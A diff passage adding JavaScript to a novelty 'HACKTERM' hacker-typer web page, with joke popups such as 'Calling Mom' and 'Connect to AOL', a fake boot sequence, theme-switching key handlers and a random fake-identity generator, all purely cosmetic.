+    this._autoClose(rec, 3500);
+  },
+
+  // 13. Calling Mom
+  _callingMom() {
+    const rec = this._create('CALLING MOM...', 520);
+    const c = this._content(rec);
+    c.innerHTML = '<div style="text-align:center;font-size:36px;" id="cm-' + rec.id + '">\uD83D\uDCF1</div><div id="cms-' + rec.id + '" style="text-align:center;margin-top:6px;"></div><div id="cml-' + rec.id + '" style="margin-top:8px;font-size:11px;"></div>';
+    const msgs = ['Hi sweetie!', 'Are you eating enough?', 'When are you visiting?'];
+    let phase = 0, msgIdx = 0, pulse = true;
+    const iv = setInterval(() => {
+      const icon = document.getElementById('cm-' + rec.id);
+      const status = document.getElementById('cms-' + rec.id);
+      const log = document.getElementById('cml-' + rec.id);
+      if (!icon) return;
+      if (phase === 0) {
+        pulse = !pulse;
+        icon.style.transform = pulse ? 'scale(1.15)' : 'scale(1)';
+        icon.style.transition = 'transform 0.2s';
+      }
+    }, 200);
+    rec.intervals.push(iv);
+    const t1 = setTimeout(() => {
+      phase = 1;
+      const status = document.getElementById('cms-' + rec.id);
+      if (status) status.innerHTML = '<span class="success">MOM ANSWERED</span>';
+    }, 1500);
+    rec.timeouts.push(t1);
+    msgs.forEach((m, i) => {
+      const t = setTimeout(() => {
+        const log = document.getElementById('cml-' + rec.id);
+        if (log) log.innerHTML += '<div>MOM: ' + m + '</div>';
+      }, 2200 + i * 800);
+      rec.timeouts.push(t);
+    });
+    this._autoClose(rec, 2200 + msgs.length * 800 + 600);
+  },
+
+  // 14. Connect to AOL
+  _connectAOL() {
+    const services = ['CONNECTING TO AOL', 'CONNECTING TO GEOCITIES', 'CONNECTING TO MYSPACE'];
+    const rec = this._create(services[ri(0, services.length-1)], 600);
+    const c = this._content(rec);
+    const steps = ['Dialing...', 'Handshaking...', 'Negotiating protocol...', 'Connected at 56.6 kbps!'];
+    c.innerHTML = '<div id="aol-' + rec.id + '"></div>';
+    try { AudioEngine.playModem(); } catch(e) {}
+    steps.forEach((s, i) => {
+      const t = setTimeout(() => {
+        const el = document.getElementById('aol-' + rec.id);
+        if (el) el.innerHTML += '<div>' + (i === steps.length-1 ? '<span class="success">' + s + '</span>' : s) + '</div>';
+      }, 600 * i);
+      rec.timeouts.push(t);
+    });
+    this._autoClose(rec, 3500);
+  },
+
+  // 15. Neural Net
+  _neuralNet() {
+    const rec = this._create('TRAINING NEURAL NET', 640);
+    const c = this._content(rec);
+    c.innerHTML = '<div id="nn-' + rec.id + '" style="font-size:11px;"></div><div style="margin-top:4px;"><span class="dim">Accuracy:</span> <span id="nna-' + rec.id + '">0%</span></div><div id="nnb-' + rec.id + '" style="margin-top:2px;font-size:10px;color:var(--color-primary);"></div>';
+    let epoch = 0, loss = 2.5, acc = 0;
+    const iv = setInterval(() => {
+      epoch++;
+      loss = Math.max(0.01, loss * (0.82 + Math.random() * 0.1));
+      acc = Math.min(99.8, acc + ri(2, 8));
+      const el = document.getElementById('nn-' + rec.id);
+      const accEl = document.getElementById('nna-' + rec.id);
+      const barEl = document.getElementById('nnb-' + rec.id);
+      if (el) el.innerHTML = 'Epoch ' + epoch + '/100 - loss: ' + loss.toFixed(4) + ' - acc: ' + acc.toFixed(1) + '%';
+      if (accEl) accEl.textContent = acc.toFixed(1) + '%';
+      if (barEl) {
+        const bars = Math.floor(acc / 5);
+        barEl.textContent = '\u2588'.repeat(bars) + '\u2591'.repeat(20 - bars);
+      }
+      if (epoch >= 25) { clearInterval(iv); if (el) el.innerHTML += '<br><span class="success">TRAINING COMPLETE</span>'; this._autoClose(rec, 800); }
+    }, 150);
+    rec.intervals.push(iv);
+    this._autoClose(rec, 4500);
+  }
+};
+
+function handleKey(e) {
+  if (dom.fsPrompt && !dom.fsPrompt.classList.contains('fade')) {
+    dom.fsPrompt.classList.add('fade');
+    setTimeout(() => { if (dom.fsPrompt) dom.fsPrompt.remove(); dom.fsPrompt = null; }, 1000);
+  }
+  AudioEngine.init();
+
+  // Jailbreak game active: let the game handle its own keys
+  if (state.jailbreakActive) return;
+
+  // Prank mode escape
+  if (state.prankMode) {
+    if ((e.key === 'P' && e.shiftKey) || e.key === 'Escape') {
+      e.preventDefault();
+      PrankMode.toggle();
+    }
+    return;
+  }
+
+  // Terminal mode: capture all input
+  if (state.terminalOpen) {
+    e.preventDefault();
+    if (e.key === 'Escape') { Terminal.close(); return; }
+    if (e.key === '`' || e.key === '~') { Terminal.close(); return; }
+    if (e.key === 'Enter') { Terminal.execute(); return; }
+    if (e.key === 'Backspace') { Terminal.delChar(); return; }
+    if (!e.ctrlKey && !e.altKey && !e.metaKey && e.key.length === 1) {
+      Terminal.addChar(e.key);
+      AudioEngine.playTypeSound();
+    }
+    return;
+  }
+
+  if (e.key === 'Escape' && PopupDialogs.activePopups.length > 0) { e.preventDefault(); PopupDialogs.closeAll(); return; }
+  if (e.key === 'Escape') { e.preventDefault(); toggleSettings(); return; }
+  if (state.settingsOpen) return;
+
+  // Tilde/backtick opens terminal
+  if (e.key === '`' || e.key === '~') { e.preventDefault(); Terminal.open(); return; }
+
+  // Prank mode toggle
+  if (e.key === 'P' && e.shiftKey) { e.preventDefault(); PrankMode.toggle(); return; }
+
+
+  switch (e.key) {
+    case 'F1': e.preventDefault(); Overlays.show('granted', 3000, () => AudioEngine.playGranted()); break;
+    case 'F2': e.preventDefault(); Overlays.show('denied', 3000, () => AudioEngine.playDenied()); break;
+    case 'F3': e.preventDefault(); Overlays.show('firewall', 4000); break;
+    case 'F4': e.preventDefault(); Overlays.show('download', 5000); break;
+    case 'F9': e.preventDefault(); Overlays.show('trace', 4000); break;
+    case 'F6': e.preventDefault(); Overlays.show('encrypt', 4000); break;
+    case 'F7': e.preventDefault(); Overlays.show('satellite', 0); break;
+    case 'F8': e.preventDefault(); Glitch.toggle(); break;
+    case 'Tab': e.preventDefault(); TypingEngine.toggleAuto(); break;
+    case '1': Themes.set('matrix'); break;
+    case '2': Themes.set('cyberpunk'); break;
+    case '3': Themes.set('military'); break;
+    case '4': Themes.set('redalert'); break;
+    case '5': Themes.set('darkcyber'); break;
+    case '6': Themes.set('synthwave'); break;
+    case '7': Themes.set('deepblack'); break;
+    default:
+      if (!e.ctrlKey && !e.altKey && !e.metaKey && e.key.length === 1 && !'1234567'.includes(e.key)) {
+        TypingEngine.type();
+        TypingTrail.emit();
+      }
+      break;
+  }
+}
+
+let frameCount = 0;
+function animLoop() {
+  MatrixRain.draw(); Radar.draw(); Particles.draw();
+  if (frameCount % 3 === 0) Stats.update();
+  frameCount++;
+  requestAnimationFrame(animLoop);
+}
+
+// ===== BOOT SEQUENCE =====
+function runBootSequence(callback) {
+  const bootScreen = document.getElementById('boot-screen');
+  const bootText = document.getElementById('boot-text');
+  const lines = [
+    'BIOS v3.1.4 ... OK',
+    'Memory Test: 65536 KB ... OK',
+    'Detecting hardware ... OK',
+    'Loading kernel modules...',
+    'Initializing network interfaces...',
+    'Mounting encrypted volumes...',
+    'Establishing secure tunnel ...',
+    'Loading exploit framework ...',
+    'Starting HACKTERM v3.1...',
+    '',
+    '[READY]'
+  ];
+
+  let lineIdx = 0;
+  let charIdx = 0;
+  let currentText = '';
+
+  function typeNext() {
+    if (lineIdx >= lines.length) {
+      // Done - fade out boot screen, show app
+      setTimeout(() => {
+        bootScreen.classList.add('fade-out');
+        document.getElementById('app').style.display = '';
+        setTimeout(() => {
+          bootScreen.classList.add('hidden');
+          callback();
+        }, 500);
+      }, 200);
+      return;
+    }
+    const line = lines[lineIdx];
+    if (charIdx < line.length) {
+      currentText += line[charIdx];
+      bootText.textContent = currentText;
+      charIdx++;
+      setTimeout(typeNext, 8 + Math.random() * 5);
+    } else {
+      currentText += '\n';
+      bootText.textContent = currentText;
+      lineIdx++;
+      charIdx = 0;
+      setTimeout(typeNext, 25 + Math.random() * 40);
+    }
+  }
+  typeNext();
+}
+
+// ===== FAKE IDENTITY GENERATOR =====
+function generateIdentity() {
+  const aliases = [
+    'GHOST_PHANTOM','ZER0DAY','DARKM4TTER','SHADOW_ROOT','NULL_BYTE',
+    'CYB3R_WOLF','N3CR0','VECT0R','PHANTOM_X','DEAD_PIXEL',
+    'BL4CK_ICE','SYN_FL00D','R00TKIT','CIPHER_PUNK','DARK_N0DE',
+    'V01D_WALK3R','NETW0RK_GHOST','EXPL01T_X'
+  ];
+  const locations = [
+    'OSLO, NORWAY','TOKYO, JAPAN','REYKJAVIK, ICELAND','BUCHAREST, ROMANIA',
+    'SEOUL, SOUTH KOREA','PRAGUE, CZECH REPUBLIC','HELSINKI, FINLAND',
+    'TALLINN, ESTONIA','ZURICH, SWITZERLAND','BERLIN, GERMANY',
+    'SINGAPORE','HONG KONG','AMSTERDAM, NETHERLANDS'
+  ];
+  const alias = aliases[ri(0, aliases.length - 1)];
+  const ip = ri(10,223) + '.' + ri(0,255) + '.' + ri(0,255) + '.' + ri(1,254);
+  const loc = locations[ri(0, locations.length - 1)];
+  return alias + ' // ' + ip + ' // ' + loc;
+}
+
+function init() {
+  dom.codeOutput = document.getElementById('code-output-inner');
+  dom.codeOutputContainer = document.getElementById('code-output');
+  dom.logContent = document.getElementById('log-content');
+  dom.logCountEl = document.getElementById('log-count');
+  dom.fileTreeContent = document.getElementById('file-tree-content');
+  dom.clock = document.getElementById('clock');
+  dom.themeLabel = document.getElementById('theme-label');
+  dom.settingsModal = document.getElementById('settings-modal');
+  dom.fsPrompt = document.getElementById('fs-prompt');
+  dom.autotypeSpeed = document.getElementById('autotype-speed');
+  dom.terminalPopup = document.getElementById('terminal-popup');
+  dom.terminalOutput = document.getElementById('terminal-popup-output');
+  dom.promptInput = document.getElementById('prompt-input');
+
+  // Set random identity in top bar
+  const topBarIdentity = document.querySelector('#top-bar > span:first-child');
+  if (topBarIdentity) {
+    topBarIdentity.innerHTML = '<span class="status-dot"></span>' + generateIdentity();
+  }
+
+  // Terminal popup close button
+  document.getElementById('terminal-popup-close').addEventListener('click', () => Terminal.close());
+
+  renderFileTree();
+  updateSpacer();
+  window.addEventListener('resize', () => { updateSpacer(); scrollCodeToBottom(); });
+  MatrixRain.init(document.getElementById('matrix-rain'));
+  Radar.init(document.getElementById('radar-canvas'));
+  Particles.init(document.getElementById('particles'));
+  PopupDialogs.init();
+  setInterval(() => Stats.randomize(), 2000);
+  setInterval(() => LogPanel.add(), 600 + Math.random() * 800);
+  for (let i = 0; i < 5; i++) LogPanel.add();
+  setInterval(updateClock, 50); updateClock();
+
+  document.addEventListener('keydown', handleKey);
+
+  document.getElementById('btn-sound').addEventListener('click', function() { state.soundEnabled = !state.soundEnabled; this.textContent = state.soundEnabled ? 'ON':'OFF'; this.classList.toggle('active', state.soundEnabled); });
+  document.getElementById('btn-crt').addEventListener('click', function() { state.crtEnabled = !state.crtEnabled; document.getElementById('crt-overlay').classList.toggle('disabled', !state.crtEnabled); this.textContent = state.crtEnabled ? 'ON':'OFF'; this.classList.toggle('active', state.crtEnabled); });
+  document.getElementById('btn-matrix').addEventListener('click', function() { state.matrixEnabled = !state.matrixEnabled; this.textContent = state.matrixEnabled ? 'ON':'OFF'; this.classList.toggle('active', state.matrixEnabled); });
+  dom.autotypeSpeed.addEventListener('input', function() { if (state.autoType) { TypingEngine.stopAuto(); TypingEngine.startAuto(); } });
+
+  setTimeout(() => { if (dom.fsPrompt) { dom.fsPrompt.classList.add('fade'); setTimeout(() => { if (dom.fsPrompt) dom.fsPrompt.remove(); dom.fsPrompt = null; }, 1000); } }, 5000);
+  requestAnimationFrame(animLoop);
+}
+
+document.addEventListener('DOMContentLoaded', function() {
+  runBootSequence(init);
+});
+})();
+</script>
+</body>
+</html>
